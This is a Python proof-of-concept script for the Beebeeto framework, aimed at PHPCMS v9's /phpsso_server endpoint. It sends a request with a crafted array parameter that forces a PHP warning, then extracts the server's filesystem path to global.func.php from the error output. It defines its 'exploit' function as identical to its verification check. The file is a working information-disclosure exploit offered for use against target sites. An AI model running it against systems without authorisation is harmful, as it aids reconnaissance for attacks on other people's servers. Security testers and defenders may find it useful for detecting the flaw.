#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0117',
            'name': 'PHPCMS v9 /phpsso_server Infomation Disclosure POC',
            'author': 'flsf',
            'create_date': '2014-10-27',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'PHPCMS',
            'vul_version': ['V9'],
            'type': 'Infomation Disclosure',
            'tag': ['PHPCMS漏洞', '/phpsso_server', 'Infomation Disclosure', '信息泄露漏洞', 'php'],
            'desc': 'The functions in the global.func.php can not handle with array,so it raise an error.',
            'references': ['',
                           ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + "/phpsso_server/?m=phpsso&c=index&a=getuserinfo&appid=1&data%5busername%5d=ks"
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        try:
            request = urllib2.Request(verify_url)
            response = urllib2.urlopen(request)
            content = response.read()
        except urllib2.HTTPError, e:
            content = e.read()

        match = cls.match_patter(content)
        if match:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['Disclosure'] = match[0]
            return args
        args['success'] = False
        return args

    @staticmethod
    def match_patter(content, pattern=r'Warning.*?((?:[a-z]:\\(?:[\\\w|\s|\-|\.|\x81-\xfe|\x40-\xfe]+?)global\.func\.php)|(?:/[^<>]+?global\.func\.php))'):
        match = re.findall(pattern, content, re.I|re.M)
        return match

    exploit = verify


if __name__ == "__main__":
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())